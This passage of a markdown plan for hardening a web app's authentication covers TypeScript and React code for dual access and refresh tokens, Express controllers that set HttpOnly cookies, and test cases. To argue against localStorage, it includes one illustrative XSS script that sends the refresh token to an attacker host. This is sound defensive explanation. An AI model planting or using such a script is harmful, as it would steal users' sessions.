  } else {
    console.log('🗑️ [AUTH] Access token cleared from memory');
  }
}

/**
 * ✅ NEW: Set refresh token (localStorage - persists across sessions)
 */
export function setRefreshToken(token: string | null) {
  refreshToken = token;
  
  if (token) {
    try {
      localStorage.setItem(REFRESH_TOKEN_KEY, token);
      console.log('🔐 [AUTH] Refresh token stored in localStorage');
    } catch (error) {
      console.error('❌ [AUTH] Failed to store refresh token:', error);
      throw error;
    }
  } else {
    try {
      localStorage.removeItem(REFRESH_TOKEN_KEY);
      console.log('🗑️ [AUTH] Refresh token cleared from localStorage');
    } catch (error) {
      console.warn('⚠️ [AUTH] Failed to clear refresh token:', error);
    }
  }
}

/**
 * ✅ MODIFIED: Get access token (memory only)
 */
export function getAccessToken(): string | null {
  return accessToken;
}

/**
 * ✅ NEW: Get refresh token (from localStorage)
 */
export function getRefreshToken(): string | null {
  if (refreshToken) {
    return refreshToken;
  }
  
  try {
    const storedToken = localStorage.getItem(REFRESH_TOKEN_KEY);
    if (storedToken) {
      refreshToken = storedToken;
      return storedToken;
    }
  } catch (error) {
    console.warn('⚠️ [AUTH] Failed to read refresh token from localStorage:', error);
  }
  
  return null;
}

/**
 * ✅ NEW: Clear all authentication tokens
 */
export function clearAllTokens() {
  setAccessToken(null);
  setRefreshToken(null);
  console.log('🗑️ [AUTH] All tokens cleared');
}

/**
 * ✅ NEW: Refresh access token using refresh token
 */
async function refreshAccessToken(): Promise<string> {
  // If already refreshing, wait for that operation
  if (isRefreshing && refreshPromise) {
    console.log('⏳ [AUTH] Token refresh already in progress, waiting...');
    return refreshPromise;
  }
  
  isRefreshing = true;
  
  refreshPromise = (async () => {
    try {
      const currentRefreshToken = getRefreshToken();
      
      if (!currentRefreshToken) {
        throw new ApiError('NO_REFRESH_TOKEN', 'No refresh token available', 401);
      }
      
      console.log('🔄 [AUTH] Refreshing access token...');
      
      // Call refresh endpoint (without auth interceptor to avoid infinite loop)
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ refreshToken: currentRefreshToken }),
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        let errorData;
        try {
          errorData = JSON.parse(errorText);
        } catch {
          errorData = { message: errorText };
        }
        throw new ApiError(
          'REFRESH_FAILED',
          errorData.message || 'Failed to refresh token',
          response.status
        );
      }
      
      const data = await response.json();
      const { accessToken: newAccessToken, refreshToken: newRefreshToken } = data.data;
      
      // Update tokens
      setAccessToken(newAccessToken);
      setRefreshToken(newRefreshToken);
      
      console.log('✅ [AUTH] Access token refreshed successfully');
      
      // Process queued requests
      refreshQueue.forEach(({ resolve }) => resolve(newAccessToken));
      refreshQueue = [];
      
      return newAccessToken;
    } catch (error) {
      console.error('❌ [AUTH] Token refresh failed:', error);
      
      // Clear all tokens on refresh failure
      clearAllTokens();
      
      // Reject queued requests
      refreshQueue.forEach(({ reject }) => reject(error));
      refreshQueue = [];
      
      throw error;
    } finally {
      isRefreshing = false;
      refreshPromise = null;
    }
  })();
  
  return refreshPromise;
}

/**
 * ✅ MODIFIED: API request with automatic token refresh
 */
export async function apiRequest<T>(
  url: string,
  options?: RequestOptions,
  responseSchema?: z.ZodSchema<T>
): Promise<T> {
  const { method = 'GET', body, headers, skipCsrf = false, includeCredentials = false } = options || {};
  
  // Special handling for refresh endpoint - don't add auth or retry
  const isRefreshEndpoint = url === '/api/auth/refresh';
  
  const makeRequest = async (token?: string): Promise<Response> => {
    const requestHeaders: Record<string, string> = {
      ...(body instanceof FormData ? {} : { "Content-Type": "application/json" }),
      ...headers,
    };

    // Add access token (not refresh endpoint)
    if (!isRefreshEndpoint) {
      const authToken = token || getAccessToken();
      if (authToken) {
        requestHeaders['Authorization'] = `Bearer ${authToken}`;
      }
    }

    // Add CSRF token for state-changing requests
    const needsCsrf = !skipCsrf && ['POST', 'PUT', 'PATCH', 'DELETE'].includes(method.toUpperCase());
    if (needsCsrf) {
      await ensureCsrfReady();
      const csrf = getCsrfToken();
      if (!csrf) {
        throw new ApiError('CSRF_NOT_READY', 'CSRF protection not ready', 403);
      }
      requestHeaders['x-csrf-token'] = csrf;
    }

    const fetchOptions: RequestInit = {
      method,
      headers: requestHeaders,
      body: body instanceof FormData ? body : (body ? JSON.stringify(body) : undefined)
    };

    if (needsCsrf || includeCredentials) {
      fetchOptions.credentials = "include";
    }

    const fullUrl = url.startsWith('http') ? url : `${API_BASE_URL}${url}`;
    return fetch(fullUrl, fetchOptions);
  };

  try {
    const response = await makeRequest();

    // Handle 401 with token refresh (except for refresh endpoint itself)
    if (response.status === 401 && !isRefreshEndpoint) {
      console.warn('⚠️ [AUTH] 401 Unauthorized - attempting token refresh...');
      
      try {
        // Refresh token
        const newAccessToken = await refreshAccessToken();
        
        // Retry request with new token
        console.log('🔄 [AUTH] Retrying request with new access token...');
        const retryResponse = await makeRequest(newAccessToken);
        
        if (!retryResponse.ok) {
          throw new ApiError('REQUEST_FAILED', 'Request failed after token refresh', retryResponse.status);
        }
        
        return parseResponse(retryResponse, responseSchema);
      } catch (refreshError) {
        console.error('❌ [AUTH] Token refresh failed, logging out user');
        
        // Clear tokens and redirect to login
        clearAllTokens();
        
        // Trigger logout in UI (will be caught by auth provider)
        throw new ApiError('AUTH_SESSION_EXPIRED', 'Session expired, please login again', 401);
      }
    }

    if (!response.ok) {
      const errorText = await response.text();
      let errorData;
      
      try {
        errorData = JSON.parse(errorText);
      } catch {
        errorData = { message: errorText || response.statusText };
      }
      
      throw new ApiError(
        errorData.code || 'REQUEST_FAILED',
        errorData.message || response.statusText,
        response.status,
        errorData.details,
        errorData.field,
        errorData.hint
      );
    }

    return parseResponse(response, responseSchema);
    
  } catch (error) {
    // Handle CSRF token errors
    if (error instanceof ApiError && 
        (error.code.startsWith('CSRF_TOKEN_') || (error.status === 403 && error.message.toLowerCase().includes('csrf'))) &&
        !options?.__csrfRetried) {
      try {
        await ensureCsrfReady();
        return apiRequest(url, { ...(options || {}), __csrfRetried: true }, responseSchema);
      } catch (retryError) {
        throw error;
      }
    }
    
    if (error instanceof ApiError) {
      throw error;
    }
    
    if (error instanceof TypeError && error.message.includes('fetch')) {
      throw new ApiError('NETWORK_ERROR', 'Network request failed', 0);
    }
    
    throw new ApiError(
      'UNKNOWN_ERROR',
      error instanceof Error ? error.message : 'Unknown error occurred',
      0
    );
  }
}

/**
 * Helper function to parse response
 */
async function parseResponse<T>(response: Response, responseSchema?: z.ZodSchema<T>): Promise<T> {
  const responseText = await response.text();
  const contentType = response.headers.get('content-type') || '';
  
  if (contentType.includes('text/csv') || 
      contentType.includes('application/octet-stream') ||
      contentType.startsWith('image/')) {
    return responseText as T;
  }
  
  let data;
  try {
    data = responseText ? JSON.parse(responseText) : null;
  } catch {
    throw new ApiError('INVALID_RESPONSE', 'Invalid JSON response from server', response.status);
  }

  const unwrappedData = data?.success === true ? data.data : data;

  if (responseSchema) {
    try {
      const validated = responseSchema.parse(unwrappedData);
      return validated;
    } catch (error) {
      console.error('Response validation failed:', { error, receivedData: unwrappedData });
      throw new ApiError(
        'RESPONSE_VALIDATION_ERROR',
        'API response does not match expected schema',
        200,
        error instanceof Error ? error.message : 'Unknown validation error'
      );
    }
  }

  return unwrappedData;
}

// ✅ MODIFIED: Update legacy exports
export function setAuthToken(token: string | null) {
  // For backward compatibility, treat as access token
  setAccessToken(token);
}

export function getAuthToken(): string | null {
  return getAccessToken();
}

export function clearAuthToken() {
  clearAllTokens();
}
```

#### Step 2.8: Update Auth Provider
**File:** `client/src/hooks/useAuth.tsx`

**Changes:**
1. Handle both access and refresh tokens
2. Update login to store both tokens
3. Update logout to revoke refresh token

```typescript
import { createContext, useContext, useState, useEffect, useCallback, ReactNode } from 'react';
import { 
  api, 
  setAccessToken, 
  setRefreshToken, 
  getAccessToken, 
  getRefreshToken,
  clearAllTokens,
  setCsrfToken 
} from '@/lib/api-client';
import type { User } from '../../../shared/types';

interface AuthContextType {
  user: User | null;
  loading: boolean;
  login: (userData: User, accessToken: string, refreshToken: string) => Promise<void>;
  logout: () => void;
  csrfToken: string | null;
  csrfLoading: boolean;
  refreshCsrfToken: () => Promise<void>;
  getCsrfToken: () => Promise<string | null>;
}

const AuthContext = createContext<AuthContextType | null>(null);

export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [authCheckAttempted, setAuthCheckAttempted] = useState(false);
  
  const [csrfToken, setCsrfTokenState] = useState<string | null>(null);
  const [csrfLoading, setCsrfLoading] = useState(false);
  const [csrfInitialized, setCsrfInitialized] = useState(false);

  /**
   * Fetch CSRF token from server
   */
  const fetchCsrfToken = useCallback(async (): Promise<string | null> => {
    setCsrfLoading(true);
    try {
      const responseData = await api.get('/api/auth/csrf-token') as any;
      const newToken = responseData.csrfToken;
      
      if (newToken && typeof newToken === 'string') {
        setCsrfTokenState(newToken);
        setCsrfToken(newToken);
        return newToken;
      }
      
      setCsrfTokenState(null);
      setCsrfToken(null);
      return null;
    } catch (error) {
      console.error('CSRF token fetch error:', error);
      setCsrfTokenState(null);
      setCsrfToken(null);
      return null;
    } finally {
      setCsrfLoading(false);
    }
  }, []);

  const refreshCsrfToken = useCallback(async (): Promise<void> => {
    await fetchCsrfToken();
  }, [fetchCsrfToken]);

  const getCsrfTokenFunc = useCallback(async (): Promise<string | null> => {
    if (csrfToken) {
      return csrfToken;
    }
    return await fetchCsrfToken();
  }, [csrfToken, fetchCsrfToken]);

  /**
   * ✅ MODIFIED: Check authentication status
   * Now relies on refresh token for persistence
   */
  const checkAuthStatus = async () => {
    console.log('🔐 [AUTH] Checking authentication status...');
    
    try {
      // Check if we have access token in memory
      let token = getAccessToken();
      
      // If no access token but we have refresh token, we'll let the API client
      // handle the refresh automatically when we call /api/auth/me
      const hasRefreshToken = getRefreshToken();
      
      if (!token && !hasRefreshToken) {
        console.log('ℹ️ [AUTH] No tokens found - user not logged in');
        setUser(null);
        setLoading(false);
        setAuthCheckAttempted(true);
        return;
      }
      
      console.log('🔐 [AUTH] Validating authentication with server...');
      
      // Call /api/auth/me - will automatically refresh token if needed
      const userData = await api.get('/api/auth/me') as any;
      console.log('✅ [AUTH] Authentication valid, user:', userData.email);
      setUser(userData);
      
    } catch (error: any) {
      console.error('❌ [AUTH] Authentication check failed:', error);
      
      // If session expired error, clear everything
      if (error.code === 'AUTH_SESSION_EXPIRED') {
        console.log('🔒 [AUTH] Session expired, clearing all tokens');
        clearAllTokens();
      }
      
      setUser(null);
      
    } finally {
      setLoading(false);
      setAuthCheckAttempted(true);
    }
  };

  /**
   * ✅ MODIFIED: Login user with access and refresh tokens
   */
  const login = async (
    userData: User, 
    accessTokenValue: string, 
    refreshTokenValue: string
  ): Promise<void> => {
    // Store both tokens
    setAccessToken(accessTokenValue);
    setRefreshToken(refreshTokenValue);
    
    // Verify tokens were stored successfully
    const storedAccessToken = getAccessToken();
    const storedRefreshToken = getRefreshToken();
    
    if (!storedAccessToken || !storedRefreshToken) {
      console.error('Failed to store authentication tokens');
      throw new Error('Authentication token storage failed');
    }
    
    // Refresh CSRF token for authenticated session
    await refreshCsrfToken();
    
    // Update React state
    setUser(userData);
    setLoading(false);
    setAuthCheckAttempted(true);
    
    console.log('✅ [AUTH] Login successful with dual tokens');
    
    // Small delay for state updates
    await new Promise(resolve => setTimeout(resolve, 100));
  };

  /**
   * ✅ MODIFIED: Logout user and revoke refresh token
   */
  const logout = async () => {
    try {
      const currentRefreshToken = getRefreshToken();
      
      // Call logout endpoint with refresh token to revoke it
      await api.post('/api/auth/logout', { refreshToken: currentRefreshToken });
    } catch (error) {
      console.error('Logout error:', error);
    }
    
    // Clear all tokens
    clearAllTokens();
    setUser(null);
    setAuthCheckAttempted(false);
    
    // Refresh CSRF token for unauthenticated session
    await refreshCsrfToken();
    
    console.log('✅ [AUTH] Logout successful, tokens revoked');
  };

  // Initialize on mount
  useEffect(() => {
    checkAuthStatus();
    if (!csrfInitialized) {
      fetchCsrfToken().finally(() => setCsrfInitialized(true));
    }
  }, []);

  const value = {
    user,
    loading,
    login,
    logout,
    csrfToken,
    csrfLoading,
    refreshCsrfToken,
    getCsrfToken: getCsrfTokenFunc
  };

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  
  return context;
}

export function useCsrf() {
  const { csrfToken, csrfLoading, refreshCsrfToken, getCsrfToken } = useAuth();
  
  return {
    token: csrfToken,
    isLoading: csrfLoading,
    refreshToken: refreshCsrfToken,
    getToken: getCsrfToken
  };
}
```

#### Step 2.9: Update Login Pages
**File:** `client/src/pages/Auth.tsx`

**Change:** Handle both access and refresh tokens from login response

```typescript
// In the login handler:
const handleStudentLogin = async (data: { email: string; password: string }) => {
  try {
    const response = await api.post('/api/auth/student-login', data) as any;
    
    // ✅ MODIFIED: Extract both tokens
    const { user, accessToken, refreshToken } = response;
    
    // ✅ MODIFIED: Pass both tokens to login function
    await login(user, accessToken, refreshToken);
    
    navigate('/dashboard');
  } catch (error) {
    // Handle error...
  }
};

const handleTeamLogin = async (data: { email: string; password: string }) => {
  try {
    const response = await api.post('/api/auth/team-login', data) as any;
    
    // ✅ MODIFIED: Extract both tokens
    const { user, accessToken, refreshToken } = response;
    
    // ✅ MODIFIED: Pass both tokens to login function
    await login(user, accessToken, refreshToken);
    
    navigate('/dashboard');
  } catch (error) {
    // Handle error...
  }
};
```

### Testing Strategy

#### Test Case 1: Login with Dual Tokens
```
1. Login to application
2. Open DevTools → Console
3. Verify logs: "✅ [AUTH] Login successful with dual tokens"
4. Open DevTools → Application → Local Storage
5. Verify only 'refresh_token' exists (no 'auth_token' or 'access_token')
6. Verify in-memory access token via network requests (Authorization header)
```

#### Test Case 2: Automatic Token Refresh
```
1. Login to application
2. Wait 16 minutes (access token expires after 15 minutes)
3. Make any API call (e.g., navigate to different page)
4. Check console for: "🔄 [AUTH] Refreshing access token..."
5. Check console for: "✅ [AUTH] Access token refreshed successfully"
6. Verify user remains logged in seamlessly
```

#### Test Case 3: Token Refresh on Page Reload
```
1. Login to application
2. Wait 5 minutes
3. Reload page (Ctrl+R / Cmd+R)
4. Verify console shows: "🔐 [AUTH] Validating authentication with server..."
5. If access token expired, verify: "🔄 [AUTH] Refreshing access token..."
6. Verify user remains logged in
```

#### Test Case 4: Logout and Token Revocation
```
1. Login to application
2. Click logout button
3. Verify console: "✅ [AUTH] Logout successful, tokens revoked"
4. Open DevTools → Application → Local Storage
5. Verify 'refresh_token' is removed
6. Try to manually call /api/auth/refresh with old token
7. Verify 401 error (token revoked)
```

#### Test Case 5: Multiple Device Logout
```
1. Login on Device A
2. Login on Device B (same account)
3. From Device A, trigger "logout from all devices" (admin feature)
4. Verify Device B is logged out on next API call
5. Verify both refresh tokens are revoked in database
```

### Security Improvements

**Before Phase 2:**
- ✅ Single 24h JWT token
- ⚠️ No server-side revocation possible
- ⚠️ Token compromise = 24h exposure window

**After Phase 2:**
- ✅ Access token: 15 minutes (limits exposure window)
- ✅ Refresh token: 7 days (better UX, server-side revocable)
- ✅ Automatic token rotation (detects stolen refresh tokens)
- ✅ Server-side revocation (logout from all devices)
- ✅ IP + User-Agent tracking (detect suspicious activity)

### Deployment Checklist

- [ ] Database migration applied (`000x_add_refresh_tokens.sql`)
- [ ] Refresh token service tested and deployed
- [ ] Auth controller endpoints updated
- [ ] Auth routes include `/refresh` endpoint
- [ ] Client API client updated with refresh logic
- [ ] Client auth provider updated with dual token handling
- [ ] Login pages updated to handle both tokens
- [ ] All test cases passing
- [ ] Token cleanup scheduled (cron job or manual)
- [ ] Monitoring configured for token refresh rate
- [ ] Rollback procedure tested

### Estimated Effort

- **Database schema:** 1 hour
- **Server-side service:** 2-3 hours
- **Server-side routes/controllers:** 2 hours
- **Client-side API client:** 2-3 hours
- **Client-side auth provider:** 1-2 hours
- **Testing:** 2-3 hours
- **Total:** 8-12 hours

---

## Phase 3: HTTPONLY COOKIES (12-16 hours)
### Priority: MEDIUM - Eliminate XSS Vulnerability

**Goal:** Migrate from localStorage to HttpOnly cookies for refresh tokens, eliminating XSS vulnerability while maintaining functionality.

### Why HttpOnly Cookies?

**localStorage Vulnerability (Current State):**
```javascript
// ❌ Vulnerable to XSS attacks
localStorage.setItem('refresh_token', token);

// Any injected script can steal the token:
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('refresh_token'));
</script>
```

**HttpOnly Cookies (Secure):**
```javascript
// ✅ JavaScript cannot access HttpOnly cookies
// Cookie is automatically sent by browser
// XSS attacks cannot steal the token

Set-Cookie: refreshToken=xxx; HttpOnly; Secure; SameSite=Strict; Max-Age=604800
```

### Security Comparison

| Feature | localStorage | HttpOnly Cookie |
|---------|--------------|-----------------|
| XSS Protection | ❌ No | ✅ Yes |
| CSRF Protection | ✅ Yes (requires header) | ⚠️ Requires CSRF token |
| Auto-sent with requests | ❌ No (manual) | ✅ Yes (automatic) |
| Accessible to JS | ❌ Yes (vulnerable) | ✅ No (secure) |
| Works across subdomains | ⚠️ Complex | ✅ Easy |

### Implementation Steps

#### Step 3.1: Update Server Cookie Configuration
**File:** `server/config/index.ts`

```typescript
// Add cookie configuration schema
const cookieConfigSchema = z.object({
  COOKIE_SECURE: booleanSchema.default(z.literal(true)),
  COOKIE_SAMESITE: z.enum(['strict', 'lax', 'none']).default('strict'),
  COOKIE_DOMAIN: z.string().optional(),
  COOKIE_MAX_AGE: z.string().optional().transform((val) => parseInt(val || '604800', 10)), // 7 days default
});

// Export cookie config
export const cookieConfig = cookieConfigSchema.parse(process.env);
```

#### Step 3.2: Install Cookie Parser Middleware
**File:** `server/index.ts`

```typescript
import cookieParser from 'cookie-parser';

// Add cookie parser middleware (should already exist)
app.use(cookieParser());
```

#### Step 3.3: Update Auth Controller - Set HttpOnly Cookies
**File:** `server/controllers/auth.controller.ts`

```typescript
import { cookieConfig } from '../config';

export class AuthController extends BaseController {
  
  /**
   * ✅ MODIFIED: Set refresh token as HttpOnly cookie
   */
  async loginStudent(req: Request, res: Response) {
    try {
      const { email, password } = loginSchema.parse(req.body);

      const authService = getService<IAuthService>(TYPES.IAuthService);
      const result = await authService.loginStudentComplete(email, password);

      const refreshToken = await refreshTokenService.createRefreshToken(
        result.user.id,
        {
          ipAddress: req.ip,
          userAgent: req.get('user-agent'),
        }
      );
      
      // ✅ NEW: Set refresh token as HttpOnly cookie
      res.cookie('refreshToken', refreshToken, {
        httpOnly: true, // Prevents JavaScript access
        secure: cookieConfig.COOKIE_SECURE, // HTTPS only (true in production)
        sameSite: cookieConfig.COOKIE_SAMESITE, // CSRF protection
        maxAge: cookieConfig.COOKIE_MAX_AGE * 1000, // 7 days in milliseconds
        domain: cookieConfig.COOKIE_DOMAIN, // Optional: for subdomain sharing
        path: '/', // Available on all paths
      });
      
      // ✅ MODIFIED: Don't return refresh token in response body
      return this.sendSuccess(res, {
        user: result.user,
        accessToken: result.token, // Only return access token
        coolingPeriod: result.coolingPeriod,
        coolingPeriodEnds: result.coolingPeriodEnds,
      });
    } catch (error: any) {
      if (error instanceof z.ZodError) {
        return this.sendError(res, 422, 'VALIDATION_ERROR', 'Invalid input', error.errors);
      }
      
      return this.handleError(res, error, 'AuthController.loginStudent');
    }
  }
  
  /**
   * ✅ MODIFIED: Set refresh token as HttpOnly cookie (team login)
   */
  async loginTeam(req: Request, res: Response) {
    try {
      const { email, password } = teamLoginSchema.parse(req.body);

      const authService = getService<IAuthService>(TYPES.IAuthService);
      const result = await authService.loginTeamComplete(email, password);

      const refreshToken = await refreshTokenService.createRefreshToken(
        result.user.id,
        {
          ipAddress: req.ip,
          userAgent: req.get('user-agent'),
        }
      );
      
      // ✅ NEW: Set refresh token as HttpOnly cookie
      res.cookie('refreshToken', refreshToken, {
        httpOnly: true,
        secure: cookieConfig.COOKIE_SECURE,
        sameSite: cookieConfig.COOKIE_SAMESITE,
        maxAge: cookieConfig.COOKIE_MAX_AGE * 1000,
        domain: cookieConfig.COOKIE_DOMAIN,
        path: '/',
      });
      
      // ✅ MODIFIED: Don't return refresh token in response body
      return this.sendSuccess(res, {
        user: result.user,
        accessToken: result.token,
      });
    } catch (error: any) {
      if (error instanceof z.ZodError) {
        return this.sendError(res, 422, 'VALIDATION_ERROR', 'Invalid input', error.errors);
      }
      
      return this.handleError(res, error, 'AuthController.loginTeam');
    }
  }
  
  /**
   * ✅ MODIFIED: Read refresh token from HttpOnly cookie
   */
  async refreshToken(req: Request, res: Response) {
    try {
      // ✅ CHANGED: Read from cookie instead of request body
      const refreshToken = req.cookies.refreshToken;
      
      if (!refreshToken) {
        return this.sendError(res, 401, 'AUTH_NO_REFRESH_TOKEN', 'Refresh token not found');
      }
      
      // Verify and rotate refresh token
      const result = await refreshTokenService.verifyAndRotateToken(
        refreshToken,
        {
          ipAddress: req.ip,
          userAgent: req.get('user-agent'),
        }
      );
      
      // Generate new access token
      const accessToken = jwtService.sign(
        { userId: result.userId },
        { expiresIn: '15m' }
      );
      
      // ✅ NEW: Set new refresh token as HttpOnly cookie
      res.cookie('refreshToken', result.newRefreshToken, {
        httpOnly: true,
        secure: cookieConfig.COOKIE_SECURE,
        sameSite: cookieConfig.COOKIE_SAMESITE,
        maxAge: cookieConfig.COOKIE_MAX_AGE * 1000,
        domain: cookieConfig.COOKIE_DOMAIN,
        path: '/',
      });
      
      // ✅ MODIFIED: Don't return refresh token in response body
      return this.sendSuccess(res, {
        accessToken, // Only return access token
      });
    } catch (error: any) {
      if (error instanceof AuthenticationError) {
        // Clear invalid cookie
        res.clearCookie('refreshToken');
        return this.sendError(res, 401, 'AUTH_INVALID_REFRESH_TOKEN', error.message);
      }
      
      return this.handleError(res, error, 'AuthController.refreshToken');
    }
  }
  
  /**
   * ✅ MODIFIED: Clear HttpOnly cookie on logout
   */
  async logout(req: AuthenticatedRequest, res: Response) {
    try {
      // Read refresh token from cookie
      const refreshToken = req.cookies.refreshToken;
      
      if (refreshToken) {
        // Revoke the refresh token
        await refreshTokenService.revokeToken(refreshToken, 'user_logout');
      }
      
      // ✅ NEW: Clear HttpOnly cookie
      res.clearCookie('refreshToken', {
        httpOnly: true,
        secure: cookieConfig.COOKIE_SECURE,
        sameSite: cookieConfig.COOKIE_SAMESITE,
        domain: cookieConfig.COOKIE_DOMAIN,
        path: '/',
      });
      
      return this.sendSuccess(res, { message: 'Logged out successfully' });
    } catch (error) {
      return this.handleError(res, error, 'AuthController.logout');
    }
  }
}
```

#### Step 3.4: Update Client API Client
**File:** `client/src/lib/api-client.ts`

**Changes:**
1. Remove localStorage refresh token storage
2. Rely on HttpOnly cookie for refresh token
3. Update fetch requests to include credentials

```typescript
// ✅ REMOVED: Refresh token localStorage storage
// const REFRESH_TOKEN_KEY = 'refresh_token';
// let refreshToken: string | null = null;

let accessToken: string | null = null;
let csrfToken: string | null = null;

/**
 * ✅ MODIFIED: Set access token (memory only)
 */
export function setAccessToken(token: string | null) {
  accessToken = token;
  if (token) {
    console.log('🔐 [AUTH] Access token set in memory');
  } else {
    console.log('🗑️ [AUTH] Access token cleared from memory');
  }
}

/**
 * ✅ REMOVED: Refresh token management (now handled by HttpOnly cookie)
 */
// export function setRefreshToken(...) { ... }
// export function getRefreshToken(...) { ... }

/**
 * Get access token (memory only)
 */
export function getAccessToken(): string | null {
  return accessToken;
}

/**
 * Clear all authentication tokens
 */
export function clearAllTokens() {
  setAccessToken(null);
  console.log('🗑️ [AUTH] All tokens cleared (refresh token in HttpOnly cookie will expire)');
}

/**
 * ✅ MODIFIED: Refresh access token using HttpOnly cookie
 */
async function refreshAccessToken(): Promise<string> {
  if (isRefreshing && refreshPromise) {
    console.log('⏳ [AUTH] Token refresh already in progress, waiting...');
    return refreshPromise;
  }
  
  isRefreshing = true;
  
  refreshPromise = (async () => {
    try {
      console.log('🔄 [AUTH] Refreshing access token...');
      
      // ✅ CHANGED: No refresh token in body - cookie sent automatically
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        credentials: 'include', // ✅ CRITICAL: Send HttpOnly cookies
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        let errorData;
        try {
          errorData = JSON.parse(errorText);
        } catch {
          errorData = { message: errorText };
        }
        throw new ApiError(
          'REFRESH_FAILED',
          errorData.message || 'Failed to refresh token',
          response.status
        );
      }
      
      const data = await response.json();
      const { accessToken: newAccessToken } = data.data;
      // ✅ CHANGED: New refresh token is set as HttpOnly cookie by server
      
      // Update access token
      setAccessToken(newAccessToken);
      
      console.log('✅ [AUTH] Access token refreshed successfully');
      
      // Process queued requests
      refreshQueue.forEach(({ resolve }) => resolve(newAccessToken));
      refreshQueue = [];
      
      return newAccessToken;
    } catch (error) {
      console.error('❌ [AUTH] Token refresh failed:', error);
      
      // Clear access token
      clearAllTokens();
      
      // Reject queued requests
      refreshQueue.forEach(({ reject }) => reject(error));
      refreshQueue = [];
      
      throw error;
    } finally {
      isRefreshing = false;
      refreshPromise = null;
    }
  })();
  
  return refreshPromise;
}

/**
 * ✅ MODIFIED: API request with credentials for cookie support
 */
export async function apiRequest<T>(
  url: string,
  options?: RequestOptions,
  responseSchema?: z.ZodSchema<T>
): Promise<T> {
  const { method = 'GET', body, headers, skipCsrf = false, includeCredentials = false } = options || {};
  
  const isRefreshEndpoint = url === '/api/auth/refresh';
  
  const makeRequest = async (token?: string): Promise<Response> => {
    const requestHeaders: Record<string, string> = {
      ...(body instanceof FormData ? {} : { "Content-Type": "application/json" }),
      ...headers,
    };

    if (!isRefreshEndpoint) {
      const authToken = token || getAccessToken();
      if (authToken) {
        requestHeaders['Authorization'] = `Bearer ${authToken}`;
      }
    }

    const needsCsrf = !skipCsrf && ['POST', 'PUT', 'PATCH', 'DELETE'].includes(method.toUpperCase());
    if (needsCsrf) {
      await ensureCsrfReady();
      const csrf = getCsrfToken();
      if (!csrf) {
        throw new ApiError('CSRF_NOT_READY', 'CSRF protection not ready', 403);
      }
      requestHeaders['x-csrf-token'] = csrf;
    }

    const fetchOptions: RequestInit = {
      method,
      headers: requestHeaders,
      body: body instanceof FormData ? body : (body ? JSON.stringify(body) : undefined),
      // ✅ CRITICAL: Always include credentials for HttpOnly cookies
      credentials: 'include',
    };

    const fullUrl = url.startsWith('http') ? url : `${API_BASE_URL}${url}`;
    return fetch(fullUrl, fetchOptions);
  };

  // ... rest of the function remains the same (handles 401, retries, etc.)
}
```

#### Step 3.5: Update Auth Provider
**File:** `client/src/hooks/useAuth.tsx`

**Changes:**
1. Remove refresh token from login function
2. Remove refresh token from logout function

```typescript
interface AuthContextType {
  user: User | null;
  loading: boolean;
  // ✅ MODIFIED: Remove refreshToken parameter
  login: (userData: User, accessToken: string) => Promise<void>;
  logout: () => void;
  csrfToken: string | null;
  csrfLoading: boolean;
  refreshCsrfToken: () => Promise<void>;
  getCsrfToken: () => Promise<string | null>;
}

export function AuthProvider({ children }: { children: ReactNode }) {
  // ... state declarations ...

  /**
   * ✅ MODIFIED: Login user with access token only (refresh token in HttpOnly cookie)
   */
  const login = async (
    userData: User, 
    accessTokenValue: string
  ): Promise<void> => {
    // Store access token in memory
    setAccessToken(accessTokenValue);
    
    // Verify token was stored successfully
    const storedAccessToken = getAccessToken();
    
    if (!storedAccessToken) {
      console.error('Failed to store access token');
      throw new Error('Authentication token storage failed');
    }
    
    // Refresh CSRF token for authenticated session
    await refreshCsrfToken();
    
    // Update React state
    setUser(userData);
    setLoading(false);
    setAuthCheckAttempted(true);
    
    console.log('✅ [AUTH] Login successful (refresh token in HttpOnly cookie)');
    
    await new Promise(resolve => setTimeout(resolve, 100));
  };

  /**
   * ✅ MODIFIED: Logout user (refresh token automatically sent via cookie)
   */
  const logout = async () => {
    try {
      // ✅ CHANGED: No need to send refresh token - sent automatically as HttpOnly cookie
      await api.post('/api/auth/logout');
    } catch (error) {
      console.error('Logout error:', error);
    }
    
    // Clear access token
    clearAllTokens();
    setUser(null);
    setAuthCheckAttempted(false);
    
    // Refresh CSRF token for unauthenticated session
    await refreshCsrfToken();
    
    console.log('✅ [AUTH] Logout successful, HttpOnly cookie cleared by server');
  };

  // ... rest remains the same ...
}
```

#### Step 3.6: Update Login Pages
**File:** `client/src/pages/Auth.tsx`

**Change:** Remove refresh token from login calls

```typescript
const handleStudentLogin = async (data: { email: string; password: string }) => {
  try {
    const response = await api.post('/api/auth/student-login', data) as any;
    
    // ✅ MODIFIED: Only extract accessToken (refreshToken in HttpOnly cookie)
    const { user, accessToken } = response;
    
    // ✅ MODIFIED: Only pass accessToken
    await login(user, accessToken);
    
    navigate('/dashboard');
  } catch (error) {
    // Handle error...
  }
};

const handleTeamLogin = async (data: { email: string; password: string }) => {
  try {
    const response = await api.post('/api/auth/team-login', data) as any;
    
    // ✅ MODIFIED: Only extract accessToken
    const { user, accessToken } = response;
    
    // ✅ MODIFIED: Only pass accessToken
    await login(user, accessToken);
    
    navigate('/dashboard');
  } catch (error) {
    // Handle error...
  }
};
```

### Testing Strategy

#### Test Case 1: HttpOnly Cookie Set on Login
```
1. Login to application
2. Open DevTools → Application → Cookies
3. Verify 'refreshToken' cookie exists with:
   - HttpOnly: ✓ (checked)
   - Secure: ✓ (in production)
   - SameSite: Strict
   - Expires: ~7 days from now
4. Open DevTools → Console
5. Try: document.cookie
6. Verify 'refreshToken' is NOT visible (HttpOnly protection)
```

#### Test Case 2: XSS Attack Prevention
```
1. Login to application
2. Open DevTools → Console
3. Try to steal token: localStorage.getItem('refresh_token')
4. Verify: null (no token in localStorage)
5. Try: document.cookie
6. Verify: refreshToken NOT visible (HttpOnly protection)
```

